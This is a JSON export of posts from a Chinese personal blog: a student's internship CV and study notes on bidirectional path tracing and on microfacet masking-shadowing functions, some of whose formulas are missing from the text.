[{"title":"个人简历","date":"2022-02-26T07:30:00.000Z","path":"2022/02/26/CV/个人简历/","text":"郭钰鹏 天津大学-计算机科学与技术-大三本科在读个人技能熟悉算法、数据结构。高中NOIP省级赛二等奖，大一期间学习《算法导论》以及MIT的算法导论公开课，并在博客上记录过一些算法题心得。 热爱编程，熟练掌握编程语言。使用C/C++、JavaScript/Node.js、PHP等语言在WINDOWS与LINUX平台开发过实际项目。 喜欢图形学、熟悉图形学知识。从GAMES101课程入门图形学，熟读整本PBRT，通过learnopengl.com网站学习了OpenGL，阅读过一些图形学论文。现热衷于开发高性能、高表现力的实时/离线渲染程序。 拥有良好的数学以及英文功底；热爱学习，有较强的自学能力。学校数学科目拥有不错的成绩，CET6考试取得569分，可以熟练使用笔记软件(Remnote、思源笔记等)的形式将平常所学记录下来。 求职总结求职意向：实习游戏引擎开发-实习生 可在职时间：自5月15日开始，每周可实习5-6天，可连续实习直到暑假结束 联系方式/社交主页电话号码：18049625528 个人博客：https://v25bh145.github.io 微信ID：wxid-v25bh145 github：https://github.com/v25bh145 项目/工作经验个人成果realTimeAlgorithm 2022年2月至今 https://github.com/v25bh145/realTimeAlgorithm C++、OpenGL、Windows 项目介绍：为学习OpenGL与实时渲染算法所编写的一个项目，正在不断学习实时渲染算法并尝试将之复现。 pathTracer 2021年11月至今 https://github.com/v25bh145/simplePathTracer C++、Embree光线追踪核心、线程级并行、CMake、Windows 项目介绍：基于Embree光线追踪核心与Eigen矢量运算库开发的离线光线追踪渲染器，实现了如下功能，并还在根据目前所学不断迭代： 并行化，使用Windows系统接口创建进程并将各像素的渲染过程分配给不同线程进行计算。 内存安全，及时对渲染过程中创建的动态对象进行了清理。 材质，包括兰伯特反射、镜面反射、折射、菲涅尔镜面、OrenNayer微表面以及微表面材质，其中微表面材质的法线分布支持Beckmann各向同性分布以及GGX各向同性分布。 积分器，包括直接光照积分器与路径追踪积分器，以及包含体积散射的路径追踪积分器。 纹理与mipmap过滤，实现了微分光线的计算以及简单的各向同性mipmap过滤。 针孔照相机、匀质介质、拉丁超立方体采样。 学校课程成果应用层聊天协议 2021年11月 https://github.com/v25bh145/application_layer_chatting 计算机网络、Node.js、实时、Linux 项目介绍：计算机网络实践结课项目。自行设计应用层聊天协议，并基于协议使用Node.js构建一个C-S架构的实时聊天项目，支持文件传输以及加入、退出的广播。 小车控制仿真 2021年12月 https://github.com/v25bh145/carCtrl Unity、C# 项目介绍：计算机图形学的结课项目。包括使用Unity创建基本的场景，创建小车与灯光，并实现小车在场景中的控制移动与车灯的开关功能。 社团成果2019年10月-2021年4月 天外天社团 后端组入学即进入学校的天外天社团，参与了后端组项目的开发工作以及一些前端组项目的开发工作，包括理论答题/投票/问卷系统、校务系统、百团大战H5小游戏制作等等。","tags":[{"name":"简历","slug":"简历","permalink":"https://v25bh145.github.io/tags/%E7%AE%80%E5%8E%86/"}]},{"title":"双向光线追踪-02","date":"2022-01-21T09:21:00.000Z","path":"2022/01/21/coding/CG/文摘阅读/Bidirectional Path Tracing_2/","text":"论文出处：https://graphics.stanford.edu/courses/cs348b-03/papers/veach-chapter10.pdf (课程的教材) 标题：Bidirectional Path Tracing, Chapter 10, PhD Thesis 作者：E. Veach 网址：https://graphics.stanford.edu/courses/cs348b-03 注意 本文可能需要的前置知识： 光线追踪(尤其是LTE形式的推导) 采样理论(尤其是多重重要性采样) 俄罗斯轮盘赌(Russian Roulette，包括一些简单的概率论) 由于是英文论文的中文笔记，所以对于私自翻译的专业词汇加上了英文标注。 文章有些公式在推导过程中隐式使用了很多交叉知识，我擅自将其部分标注了出来并适当补充了一些推导。 文章些许地方没有看懂，妄加了些揣测，如果看到明显错误的地方请见谅。 实现中的问题图像采样与过滤为了提高对单个像素采样的精度，需要使用分层采样策略(stratified sampling)，即对像素内的多个位置进行超采样，而这些位置的选择是随机的。 补充-对像素内部的随机采样[分层采样器]分层采样器也有多种实现，倘若随机生成的点过于集中，也会造成采样结果偏差。有很多优秀的分层采样方式，如颤动(jittering)、拉丁超立方体采样(LHS)等等，详情可以阅读pbrt 7.3部分。 分层采样公式假设对一个像素内部采N份样本，则有最终像素颜色如下： 其中，$h_j$为过滤器，$I$为单次采样的结果。 估计图像函数值为了更有效率地生成路径，在采样决定单个节点后，需要缓存下节点的位置、$f$函数值(BSDF)、$\\alpha^E_i$、$\\alpha^L_i$、$G(x_{i-1}\\leftrightarrow x_i)$、$p_{\\sigma^\\perp}(x_i\\to x_{i-1})$以及$p_{\\sigma^\\perp}(x_i\\to x_{i+1})$。 决定子路径长度前文提到过，决定子路径的长度可以使用俄罗斯轮盘赌方法，设继续采样的概率为$q_i$，则终止采样的概率为$1-q_i$，有如下公式： 需要注意的是，为了保持其期望值$E=E(qf)+E((1-q)*0)=E(qf)=qE(f)$不变，俄罗斯轮盘赌需要将原概率P乘以继续采样的概率$q_i$，以维持无偏估计，如下： 子路径长度的特殊情况光路长度为0当光路长度为0时，光路上并没有节点。即是当眼路采样到光源上的一点的情况，这时不用做复杂的可见性检测(测试两点之间是否有障碍)。这种情况导致了大面积光源或镜面下焦散的产生， 光路长度为1当光路长度为1时，光路上只有一个在随机光源上随机采样得到的节点。这种情况可以等价于直接光照。在基础算法下，可以不对其做任何事，只是计算光源节点到眼路最前一个节点辐亮度值与其他值。而在改进情况下，可以遍历眼路的所有节点，依次计算遍历节点到光源节点的辐亮度值与其他值，最后将遍历结果相加起来取加权平均值作为这种划分的计算结果。 （眼路长度为0、1的情况没有看懂，也没找到相关的资料）处理镜面表面镜面表面由于使用了Delta分布，因此存在值为0的问题，具体有两个地方需要特别注意： 计算镜面的c值(连接边) 在设计BSDF函数的时候如果不是采样取值，一般都会返回0值，只有sample_f是非零，且只会返回一个确定的采样方向。 当连接点其中之一所在的材质具有镜面属性时，由镜面的Delta属性(Dirac分布)，其$f_s$(BSDF)值会得到0值。回顾连接边的公式： 迭代i值划分路径回顾上文，当逐步增加光路长度时，需要将结果值乘以下值： 而当$x_{i+1},x_i,x_{i-1}$其中一项具有镜面属性时，有可能使得分数=0甚至正无穷。 解决方法通过在计算光线追踪时引入一个镜面标志位(specular flag)，可以在记录采样点时顺便记录下其是否具有镜面属性。当需要计算具有镜面属性的点的$f_s$或$P$时，可以无视此点，直接使用反射/折射定律生成另一束追踪光线对下一个点进行计算。 估计权重函数在估计权重函数时，需要通过估计概率值$p_i$估计权重函数，而有些情况下真实的概率非常难以估计，因此需要特别摘出这些情况以针对选择一些(效率上)更加合理的估算概率方法。 例如，当估计采样采样点对光源某一点上的概率密度时，精准的估计方法是计算出此点可以看到的所有光源面积，而这是十分耗时且复杂的。因此我们简单将概率密度估计为：$P_A(x)=\\frac{1}{n*area}$。其中，n为光源数量，$area$为此光源面积。 减少可见性检测的数量此节的一些假设假设$F=C_1+…+C_n$中$C_i$为单条路径的不同光路、眼路划分采样方式，且$C_i=t_i*v_i$，$t_i$为暂定贡献，$v_i$为可见性因素(非0或1)。 可见性检测的数量可以通过俄罗斯轮盘赌(RR)进行减少。注意，前文中的俄罗斯轮盘赌用于决定子路径的数量，在决定好子路径数量之后开始划分光路、眼路，在这之后，才可以使用这里所述的方式，在求单个划分方式的贡献值时尽可能提高效率。 俄罗斯轮盘赌的公式为： 需要在计算$C_i$之前估计$q_i$，以决定是否对这个划分深入计算。 简单计算$q_i$首先，可以通过设定一个轮盘赌门槛(roulette threshold, 以下简称门槛)来决定$q_i$的取值，如下： 这个方法并不很令人满意，因为门槛$\\delta$是随机选择的，如果门槛过高会导致方差过高，而门槛过低则会导致很高的计算复杂度，因此需要一种基于划分方式动态计算门槛的方式。 效率优化计算$q_i$定义估计积分F的效率估计定义式如下： 假设计算时间仅与产生的光线n成正比，包括光路与眼路发出的所有相交光线。 计算方差$\\sigma^2$由概率论知识，假设$v_i=1$，得： E[C_i]=v_it_i\\\\ \\begin{aligned}V[C_i]=&E[C_i^2]-E[C_i]^2\\\\=&\\frac{v_i^2t_i^2}{q_i}-v_i^2t_i^2\\\\=&(\\frac{1}{q_i}-1)v_i^2t_i^2\\end{aligned}设原本方法的方差为$\\sigma_0^2$，则此时的方差为$\\sigma_0^2+V[C_i]$。 计算时间T由于计算时间与n成正比，设原本方法需要发出$n_0$条光线，则现在方法需要发出$n_0-(1-q_i)$条光线 计算效率代入时间T与方差$\\sigma^2$到效率公式中，得： \\epsilon=\\frac{1}{(\\sigma_0^2+V[C_i])(n_0-(1-q_i))} q_i=t_i\\sqrt{\\frac{n_0-1}{\\sigma_0^2-t_i^2}}代入$q_i=min(1,\\frac{t_i}{\\delta})$得： 公式的两个问题 $t_i$需要在计算完整个路径后才能获得。 $t_i^2&gt;\\sigma_0^2$时，$\\delta$取复数域。 因此，为了优化$\\delta$的计算，将公式简化为如下： 估计$n_0$与$\\delta_0$ 存储到目前为止的$n_0$与$\\delta_0$作为此次估计结果： 效果不够，例如屏幕左半为黑右半为白的情况。 使用局部的$n_0$与$\\delta_0$估计当前像素的$n_0$与$\\delta_0$ 随机顺序采集像素，之后估计某像素样本时取最近(nearest)像素的$n_0$与$\\delta_0$作为其估计值。 在本文实现中，采用”s”型扫描线进行估计，只存储最后采集的N个$n_0$与$\\delta_0$。","tags":[{"name":"计算机图形学","slug":"计算机图形学","permalink":"https://v25bh145.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6/"},{"name":"光线追踪","slug":"光线追踪","permalink":"https://v25bh145.github.io/tags/%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA/"}]},{"title":"双向光线追踪-01","date":"2022-01-20T07:56:00.000Z","path":"2022/01/20/coding/CG/文摘阅读/Bidirectional Path Tracing_1/","text":"论文出处：https://graphics.stanford.edu/courses/cs348b-03/papers/veach-chapter10.pdf (课程的教材) 标题：Bidirectional Path Tracing, Chapter 10, PhD Thesis 作者：E. Veach 网址：https://graphics.stanford.edu/courses/cs348b-03 注意 本文可能需要的前置知识： 光线追踪(尤其是LTE形式的推导) 采样理论(尤其是多重重要性采样) 俄罗斯轮盘赌(Russian Roulette) 由于是英文论文的中文笔记，所以对于私自翻译的专业词汇加上了英文标注。 文章有些公式在推导过程中隐式使用了很多交叉知识，我擅自将其部分标注了出来并适当补充了一些推导。 概述每一次光线追踪采样的公式 对公式作如下说明： $\\bar x=x_o…x_k$为光线追踪采样过程的路径，且设$x_o$为光源上一点，$x_k$为照相机透镜上一点 $\\mu$为面积积分的简写 $\\mu=dA(x_0)…dA(x_k)$) $f_j$为每个路径$\\bar x$的贡献： 双向光线追踪双向光线追踪将朴素的光线追踪过程中所追踪的路径拆开来，分为光路(light path, L)与眼路(eye path, E)：其中光路从光源处(随机采样一点)开始追踪，眼路从照相机的透镜处(随机采样一点)开始追踪。一整条路径由连接这两条路径构成。 将光线追踪中一条路径的顶点个数定义为长度，则设一条路径中光路长s，眼路长t，将两条路径连接所得的总路径长$k=s+t-1$。重要的是，有许多种不同的方法对一条路径进行采样，通过划分可得出，对于一条长为k的路径，有k+2中采样方法： \\begin{cases}s = 0,& 1,& ...,& k + 1\\\\t=k+1,& k,& ...,& 0\\end{cases}为了使得采样更有效率一些，可以通过调整光路与眼路的长度(总路径长度、位置不变)来得到一条路径的不同的采样方法，而对这些采样方法的贡献值进行多重重要性采样，即可得到最终一次光线追踪的值。 该方法实质属于分组采样，将一条路径视为一个组，通过划分此路径产生各个采样值。不过这样所得的采样值之间就不再是相互独立的了。 多重重要性采样使用多重重要性采样的方式将一条路径的不同的采样方法组合起来，有以下公式： 其中，$w_{s,t}(\\bar x_{s,t})$为采样权重，$p_{s,t}(\\bar x_{s,t})$为一条路径的采样概率，稍后会给出计算的公式。 一些记号/规定设一次采样所得光路长$n_L$将光路表示为$y_0…y_{n_L-1}$，其中$y_0$在光源上。同理，设眼路长$n_E$，将眼路表示为$z_{n_E-1}…z_0$，其中$z_0$在照相机透镜上，注意眼路的表示方向是反着的。 之后，通过将路径再划分，产生了k+2个(包括先前采样的)不同的路径，记为： \\bar x_{s,t}=y_0...y_{s-1}z_{t-1}...z_0其中，设总路径长k=s+t-1，满足$0\\le s\\le n_L,0\\le t\\le n_E,k\\ge 1$。将光路与眼路连接的两节点$y_{s-1}z_{t-1}$称为连接节点(connecting vertices)，将两连接节点所连接的边称为连接边(connecting edge)。 最后，设空路径$\\epsilon$为0贡献值的路径，包含三种情况： \\begin{cases}连接节点间相互不可见的路径\\\\连接路径两端其一贡献值为0\\\\t>n_E||s>n_L\\end{cases}数学公式通过给定路径，遍历s,t值，需要计算划分的路径的贡献C： C_{s, t}\\equiv w_{s,t}(\\bar x_{s,t})\\frac{f_j(\\bar x_{s,t})}{p_{s,t}(\\bar x_{s,t})}\\\\ F=\\sum_{s\\ge0}\\sum_{t\\ge0}C_{s,t}设未定义权重的贡献C*： 计算$p_{s,t}(\\bar x_{s,t})$简写为$p_{s,t}(\\bar x_{s,t})=p_{s,t}$，一条路径的概率为两条子路径的概率的简单乘积： p_{s,t}(\\bar x_{s,t})=p^L_sp^E_t对于$p_{s,t}$，底下的下标($s,t$)代表各个路径的长度；而对于$p_s, p_t$，底下的下标(s和t)代表单条路径的路径长度。 当路径长度=0时，易得$p^L_0=p^E_0=1$。 当路径长度=1时，只在光源/照相机透镜上采样点，对于这两端的情况(即$y_0$与$z_0$)，被采样的概率即等于在光源、照相机透镜的面上进行2D采样的概率：$p^L_1=P_A(y_0),p^E_1=P_A(z_0)$。 而当路径长度不唯一时，有以下推导： P_A(y_i|y_{i-2},y_{i-1})=P_{\\sigma^\\perp}(y_{i-1}\\to y_i)G(y_{i-1}\\leftrightarrow y_i)其中，$P_{\\sigma^\\perp}(y_{i-1}\\to y_i)$为在$y_{i-1}$点上采样$y_i-y_{i-1}$方向的概率，而$G(y_{i-1}\\leftrightarrow y_i)$为光线追踪LTE公式的简写项，其等于： V(x\\leftrightarrow x')=\\begin{cases}1& x与x相互可见\\\\0& x与x相互不可见\\end{cases}对于$p_i$，有： p^L_i=P_A(y_i-1|y_{i-3},y_{i-2})p^L_{i-1}=P_{\\sigma^\\perp}(y_{i-2}\\to y_{i-1})G(y_{i-2}\\leftrightarrow y_{i-1})p^L_{i-1}\\\\ p^E_i=P_A(z_i-1|z_{i-3},z_{i-2})p^E_{i-1}=P_{\\sigma^\\perp}(z_{i-2}\\to z_{i-1})G(z_{i-2}\\leftrightarrow z_{i-1})p^E_{i-1}计算$C^*_{s,t}$ 由于f与p都是可以按照路径拆解的，因此可以将p的分解式与f的分解式一并代入，得： 对于$L^{(0)}_e(x_0)$，设光源发出的辐亮度$L_e(y_0\\to y_1)=L^{(0)}_e(x_0)L^{(1)}_e(y_0\\to y_1)$，而$f_s(y_{-1}\\to y_0\\to y_1)=L^{(1)}_e(y_0\\to y_1)$，$W^{(0)}_e(z_0)$同理。 计算$w_{s,t}$简写为$w_{s,t}(\\bar x_{s,t})=w_{s,t}$，用到上面的概率定义，将两条光路、眼路视为一条路径来观察： \\bar x_{s,t}=x_0...x_k=y_0...y_{s-1}z_{t-1}...z_0设$p_i=p_{i,(s+t)-i}(\\bar x_{s,t})$，这里概率 由多重重要性采样得，取$\\beta=2$的幂函数启发法(power heuristic)，w权重的公式如下： 当0-i个节点为光路时，$p_i$从光路开始推算，而$p_{i+1}$从眼路开始推算： p_i=p^L_i=P_{\\sigma^\\perp}(x_{i-1}\\to x_{i})G(x_{i-1}\\leftrightarrow x_{i})p^L_{i-1}=p_{i-1}\\\\ p_{i+1}=p^E_{i+1}=P_{\\sigma^\\perp}(x_{i+1}\\to x_i)G(x_{i+1}\\leftrightarrow x_{i})p^E_{i+2}=p_{i+2}相除，得： 通过逐步递增i，我们可以通过依次向光路增加一个节点，向眼路减少一个节点的方式使用除法公式算出每一项$p_i$，最后C贡献公式变为：","tags":[{"name":"计算机图形学","slug":"计算机图形学","permalink":"https://v25bh145.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6/"},{"name":"光线追踪","slug":"光线追踪","permalink":"https://v25bh145.github.io/tags/%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA/"}]},{"title":"理解微表面中的遮罩阴影函数-03","date":"2022-01-13T09:25:00.000Z","path":"2022/01/13/coding/CG/文摘阅读/Understanding the Masking-Shadowing Function in Microfacet-Based BRDFs_3/","text":"论文出处：Journal of Computer Graphics Techniques Vol.3, No. 2,2014 标题：Understanding the Masking-Shadowing Function in Microfacet-Based BRDFs 作者-时间：Eric Heitz-2014 网址：http://jcgt.org/published/0003/02/03/ 注意 本文使用的一些记号与论文相同，如下： 本文可能需要的前置知识： 辐射度量学(radiometry) 对于微表面的基本了解 渲染方程 镜面反射BRDF、漫反射BRDF 菲涅尔反射 分布间的变换[雅可比行列式] 线性代数[正定矩阵] 数值计算[2-范数(欧几里得距离)] 由于是英文论文的中文笔记，所以对于私自翻译的专业词汇加上了英文标注。 文章有些公式在推导过程中隐式使用了很多交叉知识，我擅自将其部分标注了出来并适当补充了一些推导。 遮罩函数的伸展不变性伸展不变性的定义如下图，我们将一个微表面拉伸，如果该微表面具有伸展不变性，则其法线的分布函数应当也被等比例拉伸；由于高度不变，表面被拉伸，出方向光线的斜率也被等比例拉伸： 斜率(slopes)的分布一个微表面的模型是三维的，其中Z轴即是高度，X、Y轴则是微表面对应的平面位置。约定使用一个二维向量$(x_{\\tilde m},y_{\\tilde m})$来表示一个点的斜率，其中$x_{\\tilde m}$表示切平面沿x轴的斜率，$y_{\\tilde m}$表示切平面沿y轴的斜率，如下图所示[y轴同理]： 设切平面的法线坐标为$(x_m,y_m,z_m)$，则法线在xz轴的斜率为$\\frac{z_m}{x_m}$，已知切平面与法线垂直，设切平面沿x轴切线斜率为$x_{\\tilde m}$，则有： x_{\\tilde m}\\cdot k_{\\tilde n}=-1\\\\ x_{\\tilde m}=-\\frac{x_m}{z_m}=-tan\\theta_mcos\\phi_m同理，得切平面沿y轴切线斜率： y_{\\tilde m}=-\\frac{y_m}{z_m}=-tan\\theta_msin\\phi_m同时，有法线$ω_m=(x_m,y_m,z_m)$z与斜率$(x_{\\tilde m},y_{\\tilde m})$的对应关系如下： 我们记斜率的分布为$P^{22}(x_{\\tilde m},y_{\\tilde m})$，由分布之间的变换得，从$P^{22}(x_{\\tilde m},y_{\\tilde m})$变换到$D(ω_m)$的公式为： D(ω_m)=\\frac{P^{22}(x_{\\tilde m},y_{\\tilde m})}{|J_T|}为便于表示，设$x^2+y^2+1=t$，有雅可比行列式： \\begin{aligned}J_T=&\\begin{pmatrix}\\frac{\\partial ω_{mx}}{\\partial x_{\\tilde m}}&\\frac{\\partial ω_{my}}{\\partial x_{\\tilde m}}\\\\\\frac{\\partial ω_{mx}}{\\partial y_{\\tilde m}}&\\frac{\\partial ω_{my}}{\\partial y_{\\tilde m}}\\end{pmatrix}\\\\=&\\begin{pmatrix}\\frac{x^2t^{-\\frac{1}{2}}-t^{\\frac{1}{2}}}{t}&\\frac{xyt^{-\\frac{1}{2}}}{t}\\\\\\frac{xyt^{-\\frac{1}{2}}}{t}&\\frac{y^2t^{-\\frac{1}{2}}-t^{\\frac{1}{2}}}{t}\\end{pmatrix}\\end{aligned}求解行列式|J_T|并化简，代入球坐标式，则有： |J_T|=\\frac{1}{cos^4\\theta_m} 各向同性形状不变性的斜率分布形状不变性即为将微表面模型沿x、y伸展后微表面(平均？)高度不发生变化的性质。为了将拉伸形状后的微表面模型与现有模型等效，引入粗糙度α，当改变α时仅仅改变拉伸的比例，并不改变微表面的形状，新的法线分布函数形式为：$P^{22}(x_{\\tilde m},y_{\\tilde m},α)$。 斜率经过改变后，变为$\\frac{tan\\theta_m}{\\alpha}$，如下图： 因此设法线分布的函数为： P^{22}(x_{\\tilde m},y_{\\tilde m},α)=Cf(\\frac{tan\\theta_m}{α})求出C值[注:本段论文没有出处，也没有相关公式证明，属擅自推导，请辩证观看] 论文直接给出了$P^{22}(x_{\\tilde m},y_{\\tilde m},α)=\\frac{1}{α^2}f(\\frac{tan\\theta_m}{α})$，我很好奇$\\frac{1}{α^2}$是怎么推导出的，因此尝试进行了以下证明： 将$P^{22}(x_{\\tilde m},y_{\\tilde m},α)$转换为$D(ω_m)$，得： D(ω_m)=\\frac{Cf(\\frac{tan\\theta_m}{α})}{cos^4\\theta_m}已知： $\\int_\\Omega |ω_m\\cdot ω_g|D(ω_m)dω_m=1$ $|ω_m\\cdot ω_g|=|(cos\\phi_m sin\\theta_m,\\sin\\phi_m\\sin\\theta_m,\\cos\\theta_m)\\cdot(0,0,1)|=cos\\theta_m$ 将上式代入已知，得出： \\begin{aligned} \\int_\\Omega cos\\theta_m\\frac{Cf(\\frac{tan\\theta_m}{α})}{cos^4\\theta_m}d\\omega =&\\int^{2\\pi}_0\\int^{\\frac{\\pi}{2}}_0\\frac{Ctan\\theta_mf(\\frac{tan\\theta_m}{α})}{cos^2\\theta_m}d\\theta_md\\phi_m\\\\ =&2\\pi\\int^{\\frac{\\pi}{2}}_0Ctan\\theta_mf(\\frac{tan\\theta_m}{α})dtan\\theta_m\\\\ =&2\\pi\\int^{\\infty}_0Ctf(\\frac{t}{α})dt\\\\ =&2\\pi Cα^2\\int^{\\infty}_0\\frac{t}{α}f(\\frac{t}{α})d\\frac{t}{α}\\\\ =&Cα^2\\int^{\\infty}_0uf(u)du=1 \\end{aligned}因为f是关于$\\frac{tan\\theta_m}{α}$的函数，当代入变量时f是关于u的函数，因此f中不包含变量α，因此积分项中没有变量α，故C中包含有变量项$\\frac{1}{α^2}$，不妨就设$C=\\frac{1}{α^2}$，同时可得以下两式： P^{22}(x_{\\tilde m},y_{\\tilde m},α)=\\frac{1}{α^2}f(\\frac{tan\\theta_m}{α}) \\int^{\\infty}_0xf(x)dx=1由斜率概率密度得出法线概率密度得： D(\\omega_m)=\\frac{1}{cos\\theta^4_mα^2}f(\\frac{tan\\theta_m}{α})各向同性形状不变性的形式化定义若斜率分布密度函数对于$\\lambda&gt;0$，有以下成立，则该斜率分布函数满足形状不变性。 各向同性Beckmann分布 其中，Λ函数与$G_1$遮挡项有关(见前，$G_1(ω_0)=\\frac{1}{1+Λ(ω_0)}$)，设$a=\\frac{1}{\\alpha tan\\theta_o}$，也可以对Λ函数取函数逼近，结果为： 容易证得，Beckmann分布的函数f是满足上述推导约束($\\int^{\\infty}_0xf(x)dx=1$)的。 各向同性GGX分布 函数定义以及相关说明见Beckmann分布。 各向异性形状不变性的斜率分布由上文同理得，各向异性可将α分别拆成沿x, y方向的$α_x,α_y$，由此公式变为$P^{22}(x_{\\tilde m},y_{\\tilde m},α_x,α_y)$： 经过各向异性变换后的斜率为： \\frac{1}{tan\\theta_o'}=\\frac{1}{\\sqrt{α_x^2x_o^2+α_y^2y_o^2}}=\\frac{1}{tan\\theta_o\\sqrt{cos^2\\phi_oα_x^2+sin^2\\phi_oα_y^2}}设$α_o=\\sqrt{cos^2\\phi_oα_x^2+sin^2\\phi_oα_y^2}$，含义为投影到$\\omega_o$的α值。 各向异性形状不变性的形式化定义 各向异性Beckmann分布 其中，$α_o,a$在前文定义过。 各向异性GGX分布 其中，$α_o,a$在前文定义过。 非轴方向对齐的拉伸设经过调整α改变后的微表面斜率变为$\\sqrt{||\\tilde m||^2_Q}$，$\\tilde m=(x_{\\tilde m},y_{\\tilde m})$，则广义的斜率分布公式与$α_o$变量为： P^{22}(x_{\\tilde m},y_{\\tilde m})=\\frac{1}{α_xα_y}f(\\sqrt{||\\tilde m||^2_Q}) \\frac{1}{tan\\theta_o'}=\\frac{z_o}{\\sqrt{||(x_o,y_o)||^2_Q}}其中，$||\\tilde m||_Q$为马氏距离(Mahalanobis Distance)。当$α_x,α_y$不相关(相关系数$r_{xy}=0$)时，马氏距离退化为欧几里得距离($\\frac{tan\\theta_m}{\\alpha}$)，反之，我们需求E-距离矩阵： Q^{-1}=\\begin{pmatrix}α^2_x&r_{xy}α_xα_y\\\\r_{xy}α_xα_y&α^2_y\\end{pmatrix} ||\\tilde m||^2=\\sqrt{}=\\sqrt{\\tilde m^TQ\\tilde m}其中$r_{xy}\\in[-1,1]$为相关系数，求得的结果为： Smith联合遮罩-阴影函数这里将开始讨论遮罩函数与阴影函数的组合方式，共分为分离式、高度关联、方向关联与高度-方向关联。 分离式的遮罩-阴影函数 这种形式不对遮罩函数、阴影函数间的关联性建模。 高度关联的遮罩-阴影函数 易得，微表面升高的高度越高，两条入方向、出方向被互相可见的概率就越高。这种形式当入方向、出方向相距角度很远时非常精确；相较于分离式，在相同的计算复杂度上更加精确。 方向关联的遮罩-阴影函数热点效应(Hotspot effect)：当视角与灯光方向平行时，阴影是不可见的。 高度-方向关联的遮罩-阴影函数","tags":[{"name":"计算机图形学","slug":"计算机图形学","permalink":"https://v25bh145.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6/"},{"name":"微表面","slug":"微表面","permalink":"https://v25bh145.github.io/tags/%E5%BE%AE%E8%A1%A8%E9%9D%A2/"}]},{"title":"理解微表面中的遮罩阴影函数-02","date":"2022-01-12T07:03:00.000Z","path":"2022/01/12/coding/CG/文摘阅读/Understanding the Masking-Shadowing Function in Microfacet-Based BRDFs_2/","text":"论文出处：Journal of Computer Graphics Techniques Vol.3, No. 2,2014 标题：Understanding the Masking-Shadowing Function in Microfacet-Based BRDFs 作者-时间：Eric Heitz-2014 网址：http://jcgt.org/published/0003/02/03/ 注意 本文使用的一些记号与论文相同，如下： 本文可能需要的前置知识： 辐射度量学(radiometry) 对于微表面的基本了解 渲染方程 镜面反射BRDF、漫反射BRDF 菲涅尔反射 由于是英文论文的中文笔记，所以对于私自翻译的专业词汇加上了英文标注。 文章有些公式在推导过程中隐式使用了很多交叉知识，我擅自将其部分标注了出来并适当补充了一些推导。 基于物理/不基于物理的遮罩函数Smith微表面轮廓(surface)法线的独立性Smith微表面假设微表面内的所有法线都是位置不相关的，即法线(所在点)高度与法线(所在点)临近的法线(所在点)的高度无关，呈随机分布，如下图右： 若法线高度与所在位置无关，则在远处其他自身微表面部分对法线所在点部分的遮挡中，并没有法线方向本身这一要素的参与，即可以分离$G_1$公式如下(dist=&gt;distance)： 其中，$G^{local}_1$为法线所在点自身的遮挡(即从$\\omega_o$方向是否看得到法线方向为$\\omega_m$的点)，因此是一个二进制函数(表示方法见前”注意”部分)： 遮罩函数的推导部分由$cos\\theta_o=\\int_{\\Omega}G_1(\\omega_o,\\omega_m)&lt;\\omega_o,\\omega_m&gt;D(\\omega_m)d\\omega_m$，我们将$G_1$的分离式代入，得： 由于$\\omega_o, \\omega_m$是钳制点积，二进制函数$G_1^{local}$被筛掉，我们转换即可得$G_1^{dist}$，代入$G_1(\\omega_o,\\omega_m)$中，得： Smith遮罩函数通过将上式从法线空间变换到斜率空间，上式变为： 推导见论文的附录A[未补充，留坑] Smith遮罩函数并不是精准的，但是非常近似于真实模型，主要的系统误差在于法线/遮罩独立性的假设。 V-Cavity微表面轮廓V-Cavity模型不对一个微表面的散射进行建模，而是对多个散射建模后取加权平均值。每个微表面模型都是”v”型，一个微表面模型仅仅包含两条沿表面方向相反的法线$w_m(x_m,y_m,z_m),w_m’(-x_m,-y_m,z_m)$，每个微表面对最终结果的权值为$&lt;ω_m,ω_g&gt;D(ω_m)$。 微表面的NDF(Normal Distribution Function，法线概率密度函数)D(ω)如下： 由于一个微表面只有两条法线，因此使用了Delta函数，若$ω_h$等于其中一条法线，D(ω)即有值，且满足约束式： 代入D(ω)到投影的恒等式$cos\\theta_o=\\int_\\Omega G_1(ω_o,ω)&lt;ω_o,ω&gt;D(ω)dω$中，得出： 对于得出的函数结果，由于钳制点积，存在三种情况：$ω_o$与$ω_m,ω_m’$其中之一处于同一半球面，$ω_o$与$ω_m,ω_m’$均处于同一半球面，$ω_o$与$ω_m,ω_m’$均不处于同一半球面，由于第三种情况结果为0，因此可以忽略，下面分析前两种情况，情况如下图： $ω_o$与$ω_m,ω_m’$均处于同一半球面 这种情况下$G_1=1$，因为$ω_o$对于$ω_m,ω_m’$，即”V”字的两个侧面都是可见的。 $ω_o$与$ω_m,ω_m’$其中之一处于同一半球面 我们假设$ω_o$与$ω_m$处于同一半球面，对于$ω_m’$情况同理，则上式可以简化为： 我们将$cos\\theta_o$代入$G_1$的表达式中，得出$G_1$的展开式： 综合两种情况，得出$G_1$式，将$G_1$代入$D_{ω_o}(ω_m)$，得： 证明$D_{ω_o}(ω_m)$满足约束同理，分为两种情况： $ω_o$与$ω_m,ω_m’$均处于同一半球面 \\int_\\Omega D_{ω_o}(ω_m)dω_m=\\int_\\Omega \\frac{D(ω_m)}{cos\\theta_o}dω_m=\\frac{cos\\theta_o}{cos\\theta_o}=1 $ω_o$与$ω_m,ω_m’$其中之一处于同一半球面 同，假设$ω_o$与$ω_m$处于同一半球面，对于$ω_m’$情况同理： V-Cavity的缺陷 $ω_o$在接近掠射角(grazing angle)处时，可见性表现出不真实感，就像没有褶皱一样(右为V-Cavity，左为Smith)。 $ω_o$在接近掠射角时，反射的$ω_i$比Smith平均低很多。 不基于物理的遮罩函数基于物理的微表面模型条件基于物理的微表面模型需要满足这三个上文推导出的等式： 可见法线投影后的面积须为$cos\\theta_o$： $\\int_\\Omega D_{ω_o}(ω_m)dω_m=1$ 通过弱白炉测试： 隐式遮罩函数为了简化基于镜面的BRDF等式，移除了$G_2$函数并将分母的$|ω_g\\cdot ω_o||ω_g\\cdot ω_i|$用于抵消移除$G_2$函数的影响，$G_2$被隐式定义为： 其中两项$G_1$分别被简化为： 当$ω_o=ω_g$时$G_1=1$，简化式看似是合理的，但是其并不是基于物理的。 